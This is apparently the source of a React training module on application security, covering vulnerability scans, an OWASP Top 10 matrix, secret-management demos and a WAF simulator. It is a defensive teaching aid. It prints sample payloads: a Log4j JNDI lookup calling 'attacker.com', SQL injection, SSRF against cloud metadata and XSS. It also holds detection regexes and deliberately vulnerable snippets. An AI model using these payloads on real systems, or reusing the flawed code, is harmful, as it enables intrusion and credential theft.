"use client";

import { useState } from "react";

// ==========================================
// TYPES & INTERFACES
// ==========================================

export type SeverityLevel = "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";

export interface ScanResult {
  id: string;
  cve: string;
  tool: "Trivy" | "Snyk Code" | "OWASP ZAP";
  title: string;
  severity: SeverityLevel;
  component: string;
  installedVersion: string;
  fixedVersion: string;
  cvssScore: number;
  description: string;
  remediation: string;
}

export interface OwaspItem {
  id: string;
  title: string;
  code: string;
  description: string;
  impact: string;
  payloadExample: string;
  vulnerableCode: string;
  remediatedCode: string;
  keyDefenses: string[];
}

export interface WafRule {
  id: string;
  name: string;
  type: "SQLi" | "XSS" | "RateLimit" | "GeoBlock" | "Custom";
  condition: string;
  action: "BLOCK" | "ALLOW" | "COUNT" | "CAPTCHA";
  enabled: boolean;
  hits: number;
}

// ==========================================
// MOCK DATA
// ==========================================

const INITIAL_SCAN_RESULTS: ScanResult[] = [
  {
    id: "vuln-1",
    cve: "CVE-2024-21626",
    tool: "Trivy",
    title: "Leaky Vessels Container Breakout in runc",
    severity: "CRITICAL",
    component: "runc",
    installedVersion: "v1.1.11",
    fixedVersion: "v1.1.12",
    cvssScore: 10.0,
    description: "File descriptor leak in runc allows container process to access host filesystem and escape container boundary.",
    remediation: "Upgrade base container image OS packages or update runc to >= 1.1.12 via Dockerfile / k8s node image.",
  },
  {
    id: "vuln-2",
    cve: "CVE-2023-44487",
    tool: "Trivy",
    title: "HTTP/2 Rapid Reset Denial of Service",
    severity: "HIGH",
    component: "nghttp2 / envoy",
    installedVersion: "1.52.0",
    fixedVersion: "1.57.0",
    cvssScore: 7.5,
    description: "HTTP/2 stream cancellation flood causes excessive server memory & CPU consumption, leading to service outage.",
    remediation: "Apply HTTP/2 concurrent stream limit parameters or upgrade web proxy / ingress controller.",
  },
  {
    id: "vuln-3",
    cve: "SNYK-JS-EXPRESS-594238",
    tool: "Snyk Code",
    title: "Unsanitized User Input in SQL Query String",
    severity: "HIGH",
    component: "src/api/auth.ts:42",
    installedVersion: "express@4.17.1",
    fixedVersion: "Parameterized Query",
    cvssScore: 8.6,
    description: "Concatenating req.body.username directly into raw SQL string allows authentication bypass via SQL Injection.",
    remediation: "Replace template literal with parameterized query: db.query('SELECT * FROM users WHERE user = ?', [user]).",
  },
  {
    id: "vuln-4",
    cve: "CVE-2024-3094",
    tool: "Trivy",
    title: "xz-utils Malicious Backdoor Injection",
    severity: "CRITICAL",
    component: "liblzma5",
    installedVersion: "5.6.0-1",
    fixedVersion: "5.4.5",
    cvssScore: 10.0,
    description: "Obfuscated payload in xz-utils build script intercepts SSH authentication functions in sshd.",
    remediation: "Downgrade xz-utils / liblzma5 to stable version 5.4.x immediately across container base images.",
  },
  {
    id: "vuln-5",
    cve: "ZAP-2026-001",
    tool: "OWASP ZAP",
    title: "Missing HTTP Strict Transport Security (HSTS) Header",
    severity: "MEDIUM",
    component: "HTTPS Response Header",
    installedVersion: "None",
    fixedVersion: "Strict-Transport-Security: max-age=31536000",
    cvssScore: 5.3,
    description: "Server allows HTTP connections without enforcing HTTPS upgrade, exposing session tokens to MITM interception.",
    remediation: "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload to NGINX / Cloudflare.",
  },
  {
    id: "vuln-6",
    cve: "SNYK-JS-LODASH-567746",
    tool: "Snyk Code",
    title: "Prototype Pollution in lodash.defaultsDeep",
    severity: "MEDIUM",
    component: "lodash",
    installedVersion: "4.17.15",
    fixedVersion: "4.17.21",
    cvssScore: 6.5,
    description: "Unsanitized key parameter passed to defaultsDeep allows modification of Object.prototype properties.",
    remediation: "Run `npm install lodash@^4.17.21` or freeze Object.prototype in entrypoint.",
  },
  {
    id: "vuln-7",
    cve: "CVE-2023-38545",
    tool: "Trivy",
    title: "curl SOCKS5 Heap Buffer Overflow",
    severity: "HIGH",
    component: "libcurl4",
    installedVersion: "8.2.1",
    fixedVersion: "8.4.0",
    cvssScore: 8.1,
    description: "Hostname too long during SOCKS5 proxy handshake overflows heap buffer in libcurl.",
    remediation: "Upgrade libcurl package inside Alpine / Debian base images to version >= 8.4.0.",
  },
  {
    id: "vuln-8",
    cve: "ZAP-2026-002",
    tool: "OWASP ZAP",
    title: "Reflected Cross-Site Scripting (XSS) in Search Query",
    severity: "LOW",
    component: "/search?q=",
    installedVersion: "Unescaped HTML",
    fixedVersion: "HTML Entity Encoding",
    cvssScore: 3.8,
    description: "Search parameter reflected back in page DOM without escaping <script> tags.",
    remediation: "Use React JSX string rendering or encode output using DOMPurify / sanitize-html.",
  },
];

const OWASP_TOP_10: OwaspItem[] = [
  {
    id: "A01",
    code: "A01:2021",
    title: "Broken Access Control",
    description: "Failures allow unauthorized users to view, edit, or delete data belonging to other users (IDOR, privilege escalation).",
    impact: "Data exfiltration, vertical/horizontal privilege escalation, unauthorized API access.",
    payloadExample: "GET /api/v1/account?userId=1002 (Accessing User 1002 session as User 1001)",
    vulnerableCode: `// VULNERABLE: Trusting user-supplied ID parameter directly
app.get('/api/invoice/:id', async (req, res) => {
  const invoice = await db.query('SELECT * FROM invoices WHERE id = ' + req.params.id);
  res.json(invoice); // No authorization check!
});`,
    remediatedCode: `// SECURE: Enforce authorization against authenticated session
app.get('/api/invoice/:id', authMiddleware, async (req, res) => {
  const invoice = await db.query(
    'SELECT * FROM invoices WHERE id = $1 AND owner_id = $2',
    [req.params.id, req.user.id]
  );
  if (!invoice) return res.status(403).json({ error: 'Forbidden' });
  res.json(invoice);
});`,
    keyDefenses: [
      "Enforce RBAC/ABAC at domain model layer",
      "Deny access by default (Principle of Least Privilege)",
      "Log access control failures and alert on repeated violations",
    ],
  },
  {
    id: "A02",
    code: "A02:2021",
    title: "Cryptographic Failures",
    description: "Exposure of sensitive data in transit or at rest due to weak algorithms (MD5/SHA1), missing TLS, or hardcoded keys.",
    impact: "Credential theft, PII leakage, session hijacking over insecure networks.",
    payloadExample: "Intercepting plain HTTP traffic or decrypting DB passwords hashed with legacy MD5 without salt.",
    vulnerableCode: `// VULNERABLE: Plain MD5 hash without salt & hardcoded secret key
const crypto = require('crypto');
const secretKey = "SuperSecretKey123";
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
}`,
    remediatedCode: `// SECURE: Argon2id or bcrypt with random salt & KMS managed secret
const bcrypt = require('bcrypt');
async function hashPassword(password) {
  const saltRounds = 12;
  return await bcrypt.hash(password, saltRounds);
}`,
    keyDefenses: [
      "Use TLS 1.3 everywhere with strong ciphers",
      "Hash passwords with bcrypt/Argon2id with work factor >= 12",
      "Never hardcode secrets in source code; use KMS / Vault",
    ],
  },
  {
    id: "A03",
    code: "A03:2021",
    title: "Injection (SQL, Command, XSS)",
    description: "Untrusted user data sent to an interpreter as part of a command or query, resulting in unauthorized command execution.",
    impact: "Remote Code Execution (RCE), complete database takeover, session hijacking.",
    payloadExample: `' UNION SELECT 1, username, password_hash FROM users --`,
    vulnerableCode: `// VULNERABLE: Direct string concatenation in SQL & shell commands
const user = req.query.username;
db.query("SELECT * FROM users WHERE name = '" + user + "'");
exec("ping -c 1 " + req.query.host); // Command injection!`,
    remediatedCode: `// SECURE: Parameterized queries & strict input validation
db.query("SELECT * FROM users WHERE name = $1", [user]);

// Command execution replacement with execFile & array args
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', validatedHost], (err, stdout) => { ... });`,
    keyDefenses: [
      "Use ORM / Prepared Parameterized SQL queries",
      "Context-aware output encoding (HTML, JS, URL)",
      "Strict allowlist validation for all user input parameters",
    ],
  },
  {
    id: "A04",
    code: "A04:2021",
    title: "Insecure Design",
    description: "Flaws in architecture, threat modeling, and security design patterns that cannot be fixed by implementation alone.",
    impact: "Unlimited bot password guessing, missing rate limits, logical workflow bypass.",
    payloadExample: "Submitting 50,000 promo code requests concurrently due to missing transactional locking.",
    vulnerableCode: `// VULNERABLE: Unlimited password reset attempts without rate limiting or captcha
app.post('/api/reset-password', async (req, res) => {
  await sendResetEmail(req.body.email);
  res.send({ status: 'sent' });
});`,
    remediatedCode: `// SECURE: Rate-limiting, anti-automation token & IP throttling
const rateLimit = require('express-rate-limit');
const resetLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 3 });

app.post('/api/reset-password', resetLimiter, verifyCaptcha, async (req, res) => {
  await sendResetEmail(req.body.email);
  res.send({ status: 'sent' });
});`,
    keyDefenses: [
      "Integrate threat modeling (STRIDE) into architecture phase",
      "Implement circuit breakers, rate limits, and quota controls",
      "Segregate tenant resources and limit blast radius",
    ],
  },
  {
    id: "A05",
    code: "A05:2021",
    title: "Security Misconfiguration",
    description: "Default credentials left unchanged, overly verbose error stack traces, unpatched cloud S3 buckets, unnecessary open ports.",
    impact: "Full server compromise, internal infrastructure mapping, cloud bucket data leaks.",
    payloadExample: "Reading AWS metadata at http://169.254.169.254 or inspecting /debug/pprof open endpoints.",
    vulnerableCode: `// VULNERABLE: Verbose error handling returning full stack traces in Production
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack, env: process.env });
});`,
    remediatedCode: `// SECURE: Generic error message in Prod, structured logging internally
app.use((err, req, res, next) => {
  logger.error({ err, path: req.path, user: req.user?.id });
  res.status(500).json({ error: 'Internal Server Error', requestId: req.id });
});`,
    keyDefenses: [
      "Automated hardening via IaC (Terraform / Ansible)",
      "Disable unnecessary features, frameworks, and API endpoints",
      "Audit cloud IAM policies and S3 bucket public permissions",
    ],
  },
  {
    id: "A06",
    code: "A06:2021",
    title: "Vulnerable & Outdated Components",
    description: "Using third-party libraries, packages, or container images with known published CVE vulnerabilities.",
    impact: "Exploitation of zero-day or known public exploits (Log4j, Spring4Shell).",
    payloadExample: `\${jndi:ldap://attacker.com/exploit} (Log4j RCE)`,
    vulnerableCode: `// VULNERABLE: Unpinned dependencies in package.json
"dependencies": {
  "express": "*",
  "log4j-node": "1.0.0" // Vulnerable component!
}`,
    remediatedCode: `// SECURE: Lockfiles, automated vulnerability scanners in CI/CD pipeline
// .github/workflows/security.yml
// - name: Run Trivy vulnerability scanner
//   uses: aquasecurity/trivy-action@master
//   with:
//     exit-code: 1
//     severity: 'CRITICAL,HIGH'`,
    keyDefenses: [
      "Continuous CI dependency scans via Snyk / Trivy / Dependabot",
      "Software Bill of Materials (SBOM) generation & tracking",
      "Subscribe to CVE advisories and automated patch release feeds",
    ],
  },
  {
    id: "A07",
    code: "A07:2021",
    title: "Identification & Auth Failures",
    description: "Weak password policies, missing Multi-Factor Authentication (MFA), session fixation, or improper token validation.",
    impact: "Account takeover, credential stuffing attacks, session hijacking.",
    payloadExample: "Automated credential stuffing with 100k leaked username/password combos.",
    vulnerableCode: `// VULNERABLE: Storing JWT in unsecure localStorage without HTTPOnly flag
res.json({ token: jwtToken }); // Frontend puts in localStorage -> Vulnerable to XSS!`,
    remediatedCode: `// SECURE: Set JWT in HTTPOnly, Secure, SameSite=Strict Cookie
res.cookie('token', jwtToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000 // 1 hour
});`,
    keyDefenses: [
      "Enforce MFA for all user & administrator logins",
      "Use HTTPOnly, Secure cookies for web session tokens",
      "Implement breach credential lookup (HaveIBeenPwned API)",
    ],
  },
  {
    id: "A08",
    code: "A08:2021",
    title: "Software & Data Integrity Failures",
    description: "Code and infrastructure that does not protect against integrity violations (unverified auto-updates, insecure deserialization).",
    impact: "Supply chain attacks (SolarWinds style), arbitrary code execution via object deserialization.",
    payloadExample: "Tampered npm package update without cryptographic checksum verification.",
    vulnerableCode: `// VULNERABLE: Insecure deserialization of user input
const serialize = require('node-serialize');
app.post('/api/profile', (req, res) => {
  const userObj = serialize.unserialize(req.body.data); // Executed arbitrary functions!
});`,
    remediatedCode: `// SECURE: Standard JSON parsing with strict schema validation (Zod)
import { z } from 'zod';
const UserSchema = z.object({ username: z.string(), email: z.string().email() });

app.post('/api/profile', (req, res) => {
  const validated = UserSchema.parse(JSON.parse(req.body.data));
  res.json(validated);
});`,
    keyDefenses: [
      "Verify digital signatures and SHA256 checksums on build artifacts",
      "Use signed Git commits (GPG) and container image signing (Cosign)",
      "Avoid native object deserialization on untrusted payloads",
    ],
  },
  {
    id: "A09",
    code: "A09:2021",
    title: "Security Logging & Monitoring Failures",
    description: "Insufficient logging, audit trails, or real-time monitoring allows attackers to maintain persistence undetected.",
    impact: "Undetected data breaches lasting months, inability to perform post-incident forensics.",
    payloadExample: "Brute forcing admin panel over 3 weeks without a single security alert firing.",
    vulnerableCode: `// VULNERABLE: Swallowing authentication errors quietly
try {
  await authenticate(user, pass);
} catch (e) {
  // Silent fail - no log generated!
}`,
    remediatedCode: `// SECURE: Structured JSON security audit logging to SIEM (Datadog / Splunk)
try {
  await authenticate(user, pass);
} catch (e) {
  logger.warn({
    event: 'AUTH_FAILURE',
    username: user,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
  });
  throw e;
}`,
    keyDefenses: [
      "Log all authentication, authorization, and input validation failures",
      "Ensure log retention & tamper-proof centralized SIEM storage",
      "Establish automated threshold alerts for anomalous activity",
    ],
  },
  {
    id: "A10",
    code: "A10:2021",
    title: "Server-Side Request Forgery (SSRF)",
    description: "Server fetches a remote resource without validating the user-supplied URL, allowing requests to internal network services.",
    impact: "Access to internal cloud metadata (AWS IMDSv1), internal network port scanning, remote file retrieval.",
    payloadExample: "POST /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    vulnerableCode: `// VULNERABLE: Direct HTTP request to user-controlled URL
app.post('/api/preview', async (req, res) => {
  const response = await fetch(req.body.url); // Fetches internal metadata / localhost!
  const data = await response.text();
  res.send(data);
});`,
    remediatedCode: `// SECURE: Restrict allowed protocols, enforce domain allowlist, & block private IP ranges
import ipaddr from 'ipaddr.js';

function validateUrl(userUrl) {
  const parsed = new URL(userUrl);
  if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error('Invalid protocol');
  
  const ip = ipaddr.parse(parsed.hostname);
  if (ip.range() !== 'unicast') throw new Error('Private IP range blocked');
  return true;
} // Or enforce AWS IMDSv2 requiring token headers!`,
    keyDefenses: [
      "Enforce URL allowlists and sanitize hostname resolution",
      "Block requests to 127.0.0.1, 10.0.0.0/8, 169.254.169.254",
      "Enforce AWS IMDSv2 (requires session token header)",
    ],
  },
];

const INITIAL_WAF_RULES: WafRule[] = [
  {
    id: "waf-1",
    name: "OWASP Core Rule Set - SQL Injection",
    type: "SQLi",
    condition: "Regex Match: (UNION|SELECT|INSERT|DROP|--|OR\\s+1=1)",
    action: "BLOCK",
    enabled: true,
    hits: 1420,
  },
  {
    id: "waf-2",
    name: "OWASP Core Rule Set - Cross Site Scripting (XSS)",
    type: "XSS",
    condition: "Regex Match: (<script|javascript:|onload=|onerror=)",
    action: "BLOCK",
    enabled: true,
    hits: 890,
  },
  {
    id: "waf-3",
    name: "Rate Limit: Max 100 Reqs / 5 Min",
    type: "RateLimit",
    condition: "IP Request Frequency > 100 req / 300s",
    action: "BLOCK",
    enabled: true,
    hits: 310,
  },
  {
    id: "waf-4",
    name: "Geo-IP Filter: Block Tor Exit Nodes",
    type: "GeoBlock",
    condition: "IP in Known Tor Exit Node Directory",
    action: "CAPTCHA",
    enabled: true,
    hits: 145,
  },
];

export default function AppSecSection() {
  // --- Active Tab State ---
  const [activeTab, setActiveTab] = useState<
    "scanner" | "owasp" | "secrets" | "waf"
  >("scanner");

  // --- Module 1: Scanner State ---
  const [scanTool, setScanTool] = useState<"Trivy" | "Snyk Code" | "OWASP ZAP">(
    "Trivy"
  );
  const [scanTarget, setScanTarget] = useState<string>("docker.io/payment-api:v2.4.1");
  const [isScanning, setIsScanning] = useState<boolean>(false);
  const [scanLogs, setScanLogs] = useState<string[]>([]);
  const [scanProgress, setScanProgress] = useState<number>(100);
  const [scanFilterSeverity, setScanFilterSeverity] = useState<string>("ALL");
  const [selectedScanResult, setSelectedScanResult] = useState<ScanResult | null>(
    INITIAL_SCAN_RESULTS[0]
  );
  const [scanResultsList, setScanResultsList] = useState<ScanResult[]>(
    INITIAL_SCAN_RESULTS
  );

  // Run Simulated Scan
  const handleRunScan = () => {
    setIsScanning(true);
    setScanProgress(10);
    setScanLogs([`[INFO] Starting ${scanTool} scanner engine...`]);

    setTimeout(() => {
      setScanProgress(40);
      setScanLogs((prev) => [
        ...prev,
        `[INFO] Target: ${scanTarget}`,
        `[INFO] Downloading vulnerability database feed v2026.08.08...`,
        `[ANALYSIS] Inspecting layers, lockfiles, and dependencies...`,
      ]);
    }, 600);

    setTimeout(() => {
      setScanProgress(80);
      setScanLogs((prev) => [
        ...prev,
        `[WARN] Critical CVE match found in image base layer!`,
        `[ANALYSIS] Cross-referencing CVSS scores & remediated versions...`,
      ]);
    }, 1200);

    setTimeout(() => {
      setScanProgress(100);
      setIsScanning(false);
      setScanLogs((prev) => [
        ...prev,
        `[SUCCESS] Scan complete in 1.84s. Found ${INITIAL_SCAN_RESULTS.length} vulnerabilities.`,
      ]);
    }, 1800);
  };

  // --- Module 2: OWASP State ---
  const [selectedOwaspId, setSelectedOwaspId] = useState<string>("A01");
  const [testPayload, setTestPayload] = useState<string>(
    "GET /api/v1/account?userId=1002"
  );
  const [testMode, setTestMode] = useState<"vulnerable" | "remediated">(
    "vulnerable"
  );
  const [testOutput, setTestOutput] = useState<string | null>(null);

  const activeOwasp =
    OWASP_TOP_10.find((item) => item.id === selectedOwaspId) || OWASP_TOP_10[0];

  const handleTestExploit = () => {
    if (testMode === "vulnerable") {
      setTestOutput(
        `🚨 EXPLOIT SUCCESSFUL (200 OK)\n[VULNERABLE HANDLER EXECUTED PAYLOAD]\nPayload: "${testPayload}"\nOutput: Returned confidential record [User ID 1002, Email: admin@corp.internal, Role: SUPERADMIN].\nReason: No authorization check performed on session token.`
      );
    } else {
      setTestOutput(
        `🛡️ EXPLOIT BLOCKED (403 FORBIDDEN)\n[SECURE HANDLER SANITIZED & EVALUATED]\nPayload: "${testPayload}"\nOutput: { "error": "Access Denied", "code": "ERR_UNAUTHORIZED_RESOURCE_OWNER" }\nReason: Session token owner (User 1001) does not match requested resource owner (User 1002). Incident logged to SIEM.`
      );
    }
  };

  // --- Module 3: Secret Management State ---
  const [secretProvider, setSecretProvider] = useState<"vault" | "aws">(
    "vault"
  );
  const [secretPath, setSecretPath] = useState<string>(
    "secret/data/production/db_credentials"
  );
  const [secretLifecycleStep, setSecretLifecycleStep] = useState<number>(1);
  const [isSecretMasked, setIsSecretMasked] = useState<boolean>(true);
  const [secretLog, setSecretLog] = useState<string | null>(null);
  const [rotationTimer, setRotationTimer] = useState<number>(3600);

  const handleFetchSecret = () => {
    if (secretProvider === "vault") {
      setSecretLog(
        `$ vault read secret/data/production/db_credentials\nKey                 Value\n---                 -----\ncreated_time        2026-08-08T10:15:00Z\nlease_id            database/creds/readonly/s.v6X991a...\nlease_duration      1h\nlease_renewable     true\nusername            v-app-user-9481\npassword            ${
          isSecretMasked ? "••••••••••••••••" : "VaultP@ss_x89$21!qZ"
        }`
      );
    } else {
      setSecretLog(
        `$ aws secretsmanager get-secret-value --secret-id prod/db/credentials\n{\n  "ARN": "arn:aws:secretsmanager:us-east-1:123456789012:secret:prod/db/credentials-a8X",\n  "Name": "prod/db/credentials",\n  "VersionId": "b48f912c-9011-411a",\n  "SecretString": "{\\"user\\":\\"admin\\",\\"password\\":\\"${
          isSecretMasked ? "••••••••••••••••" : "AWS_KMS_Rotated_Secret#99!"
        }\\"}",\n  "CreatedDate": "2026-08-08T09:00:00Z"\n}`
      );
    }
  };

  const handleRotateSecret = () => {
    setRotationTimer(3600);
    setSecretLog(
      `🔄 ROTATION TRIGGERED (${secretProvider.toUpperCase()})\n[1] Generated new random 32-byte high-entropy password.\n[2] Executed ALTER USER in PostgreSQL database instance.\n[3] Re-encrypted secret payload using KMS Key ID (arn:aws:kms:us-east-1:key/a1b2c3d4).\n[4] Staged new secret VersionId: v-${Date.now()}.\n[5] Invalidated old lease tokens. Rotation Complete!`
    );
  };

  // --- Module 4: WAF & SSL State ---
  const [wafRules, setWafRules] = useState<WafRule[]>(INITIAL_WAF_RULES);
  const [simTrafficType, setSimTrafficType] = useState<
    "normal" | "sqli" | "xss" | "ddos"
  >("sqli");
  const [wafResult, setWafResult] = useState<string | null>(null);

  // Custom WAF Rule Form
  const [newRuleName, setNewRuleName] = useState<string>("Block Admin Path");
  const [newRuleType, setNewRuleType] = useState<
    "SQLi" | "XSS" | "RateLimit" | "GeoBlock" | "Custom"
  >("Custom");
  const [newRuleCond, setNewRuleCond] = useState<string>("URL Path matches /admin/*");
  const [newRuleAction, setNewRuleAction] = useState<
    "BLOCK" | "ALLOW" | "COUNT" | "CAPTCHA"
  >("BLOCK");

  // SSL Settings
  const [tls12, setTls12] = useState<boolean>(true);
  const [tls13, setTls13] = useState<boolean>(true);
  const [enableHsts, setEnableHsts] = useState<boolean>(true);
  const [enableCsp, setEnableCsp] = useState<boolean>(true);
  const [enableXFrame, setEnableXFrame] = useState<boolean>(true);
  const [enableWeakCiphers, setEnableWeakCiphers] = useState<boolean>(false);

  const toggleWafRule = (id: string) => {
    setWafRules((prev) =>
      prev.map((r) => (r.id === id ? { ...r, enabled: !r.enabled } : r))
    );
  };

  const handleAddWafRule = (e: React.FormEvent) => {
    e.preventDefault();
    const rule: WafRule = {
      id: `waf-${Date.now()}`,
      name: newRuleName,
      type: newRuleType,
      condition: newRuleCond,
      action: newRuleAction,
      enabled: true,
      hits: 0,
    };
    setWafRules((prev) => [...prev, rule]);
  };

  const handleTestWafTraffic = () => {
    let payload = "";
    if (simTrafficType === "normal") payload = "GET /api/v1/products?category=electronics";
    if (simTrafficType === "sqli") payload = "POST /login body={ username: \"admin' OR 1=1 --\" }";
    if (simTrafficType === "xss") payload = "POST /comment body={ text: \"<script>alert(1)</script>\" }";
    if (simTrafficType === "ddos") payload = "BURST: 500 requests in 1 second from IP 198.51.100.42";

    // Evaluate against active WAF rules
    let blockedByRule: WafRule | null = null;
    if (simTrafficType === "sqli") {
      blockedByRule = wafRules.find((r) => r.enabled && r.type === "SQLi") || null;
    } else if (simTrafficType === "xss") {
      blockedByRule = wafRules.find((r) => r.enabled && r.type === "XSS") || null;
    } else if (simTrafficType === "ddos") {
      blockedByRule = wafRules.find((r) => r.enabled && r.type === "RateLimit") || null;
    }

    if (blockedByRule) {
      // Increment hits
      setWafRules((prev) =>
        prev.map((r) =>
          r.id === blockedByRule!.id ? { ...r, hits: r.hits + 1 } : r
        )
      );
      setWafResult(
        `⛔ WAF ACTION: ${blockedByRule.action} (403 Forbidden)\nRule Matched: "${blockedByRule.name}" [ID: ${blockedByRule.id}]\nCondition: ${blockedByRule.condition}\nPayload Analyzed: "${payload}"\nVerdict: Request inspected at L7 layer and dropped before reaching upstream web application.`
      );
    } else {
      setWafResult(
        `✅ WAF ACTION: ALLOW (200 OK)\nPayload: "${payload}"\nVerdict: Request passed all enabled inspection filters cleanly and routed to backend web service.`
      );
    }
  };

  // SSL Labs Grade Calculation
  const computeSslGrade = () => {
    if (enableWeakCiphers) return { grade: "F", color: "text-rose-600", reason: "Weak RC4/3DES ciphers enabled!" };
    if (!tls13 && !tls12) return { grade: "F", color: "text-rose-600", reason: "No valid TLS protocols enabled!" };
    if (!enableHsts) return { grade: "B", color: "text-amber-600", reason: "HSTS header missing (Vulnerable to SSL Strip)." };
    if (!enableCsp) return { grade: "A-", color: "text-indigo-600", reason: "Content-Security-Policy missing." };
    if (tls13 && enableHsts && enableCsp && enableXFrame) return { grade: "A+", color: "text-emerald-600", reason: "Optimal TLS 1.3 & Security Headers Hardening!" };
    return { grade: "A", color: "text-emerald-600", reason: "Strong TLS configuration." };
  };

  const sslGrade = computeSslGrade();

  // Filtered Scan Results
  const filteredScanResults = scanResultsList.filter((item) => {
    if (scanFilterSeverity === "ALL") return true;
    return item.severity === scanFilterSeverity;
  });

  return (
    <section className="space-y-8 text-slate-900">
      {/* Track Header */}
      <div className="p-6 rounded-xl bg-white border border-slate-200 card-shadow">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className="px-2.5 py-0.5 rounded-full bg-rose-50 text-rose-600 border border-rose-400/20 text-xs font-mono font-semibold">
                Cybersecurity & AppSec Track
              </span>
              <span className="text-xs text-slate-500 font-mono">Module 4 of 5</span>
            </div>
            <h2 className="text-2xl sm:text-3xl font-extrabold text-slate-900">
              Application Security & Vulnerability Management
            </h2>
            <p className="text-sm text-slate-500 mt-1 max-w-3xl">
              Master SAST/DAST container scanning, OWASP Top 10 exploits & remediation, HashiCorp Vault vs AWS Secrets Manager workflows, and Web Application Firewall (WAF) rule engines.
            </p>
          </div>
        </div>

        {/* Navigation Tabs */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-6">
          <button
            onClick={() => setActiveTab("scanner")}
            className={`px-4 py-2.5 rounded-lg text-xs font-semibold flex items-center justify-center gap-2 transition-all ${
              activeTab === "scanner"
                ? "bg-indigo-600 text-slate-900 shadow-lg shadow-[#58a6ff]/20 font-bold"
                : "bg-white text-slate-500 hover:text-slate-900 border border-slate-200"
            }`}
          >
            <span>🔍</span> SAST/DAST & Container Scans
          </button>

          <button
            onClick={() => setActiveTab("owasp")}
            className={`px-4 py-2.5 rounded-lg text-xs font-semibold flex items-center justify-center gap-2 transition-all ${
              activeTab === "owasp"
                ? "bg-indigo-600 text-slate-900 shadow-lg shadow-[#58a6ff]/20 font-bold"
                : "bg-white text-slate-500 hover:text-slate-900 border border-slate-200"
            }`}
          >
            <span>🛡️</span> OWASP Top 10 Matrix
          </button>

          <button
            onClick={() => setActiveTab("secrets")}
            className={`px-4 py-2.5 rounded-lg text-xs font-semibold flex items-center justify-center gap-2 transition-all ${
              activeTab === "secrets"
                ? "bg-indigo-600 text-slate-900 shadow-lg shadow-[#58a6ff]/20 font-bold"
                : "bg-white text-slate-500 hover:text-slate-900 border border-slate-200"
            }`}
          >
            <span>🔑</span> Secret Management Workflow
          </button>

          <button
            onClick={() => setActiveTab("waf")}
            className={`px-4 py-2.5 rounded-lg text-xs font-semibold flex items-center justify-center gap-2 transition-all ${
              activeTab === "waf"
                ? "bg-indigo-600 text-slate-900 shadow-lg shadow-[#58a6ff]/20 font-bold"
                : "bg-white text-slate-500 hover:text-slate-900 border border-slate-200"
            }`}
          >
            <span>🧱</span> WAF Engine & SSL Hardening
          </button>
        </div>
      </div>

      {/* ========================================================= */}
      {/* TAB 1: SAST/DAST & CONTAINER VULNERABILITY SCANNER        */}
      {/* ========================================================= */}
      {activeTab === "scanner" && (
        <div className="space-y-6">
          {/* Controls Bar */}
          <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow space-y-4">
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div>
                <h3 className="text-lg font-bold text-slate-900">
                  1. SAST / DAST & Container Vulnerability Scanner
                </h3>
                <p className="text-xs text-slate-500">
                  Simulate Trivy container image scans, Snyk SAST code analysis, and OWASP ZAP DAST web inspection.
                </p>
              </div>

              <button
                onClick={handleRunScan}
                disabled={isScanning}
                className="px-5 py-2.5 rounded-lg bg-indigo-600 text-slate-900 font-semibold text-xs hover:bg-indigo-600/90 transition-all disabled:opacity-50 flex items-center gap-2"
              >
                {isScanning ? (
                  <>
                    <span className="animate-spin">⏳</span> Scanning...
                  </>
                ) : (
                  <>
                    <span>🚀</span> Run Security Scan
                  </>
                )}
              </button>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-2">
              <div>
                <label className="block text-xs text-slate-500 mb-1">
                  Scanner Engine:
                </label>
                <select
                  value={scanTool}
                  onChange={(e) =>
                    setScanTool(e.target.value as "Trivy" | "Snyk Code" | "OWASP ZAP")
                  }
                  className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
                >
                  <option value="Trivy">Trivy (Container Image Scanner)</option>
                  <option value="Snyk Code">Snyk Code (SAST Static Analysis)</option>
                  <option value="OWASP ZAP">OWASP ZAP (DAST Dynamic Web Scanner)</option>
                </select>
              </div>

              <div className="sm:col-span-2">
                <label className="block text-xs text-slate-500 mb-1">
                  Scan Target Target / Image / Repo:
                </label>
                <input
                  type="text"
                  value={scanTarget}
                  onChange={(e) => setScanTarget(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
                  placeholder="e.g. docker.io/my-app:v1.0"
                />
              </div>
            </div>

            {/* Progress Bar & Scan Terminal Stream */}
            {scanLogs.length > 0 && (
              <div className="mt-4 p-4 rounded-lg bg-slate-50 border border-slate-200 font-mono text-xs space-y-2">
                <div className="flex items-center justify-between text-slate-500">
                  <span>Scan Stream Logs</span>
                  <span>{scanProgress}% Completed</span>
                </div>
                <div className="w-full h-2 rounded-full bg-white overflow-hidden">
                  <div
                    className="h-full bg-indigo-600 transition-all duration-500"
                    style={{ width: `${scanProgress}%` }}
                  />
                </div>
                <div className="max-h-32 overflow-y-auto space-y-1 text-xs text-emerald-600">
                  {scanLogs.map((log, idx) => (
                    <div key={idx}>{log}</div>
                  ))}
                </div>
              </div>
            )}
          </div>

          {/* Scan Results Summary Cards */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
            <div className="p-4 rounded-xl bg-slate-50 border border-rose-200 bg-gradient-to-br from-[#ff7b72]/5 to-transparent">
              <div className="text-xs text-slate-500">Critical CVEs</div>
              <div className="text-2xl font-extrabold text-rose-600 mt-1">
                {scanResultsList.filter((r) => r.severity === "CRITICAL").length}
              </div>
              <div className="text-[11px] text-rose-600/80 mt-1 font-mono">
                Immediate Patch Required
              </div>
            </div>

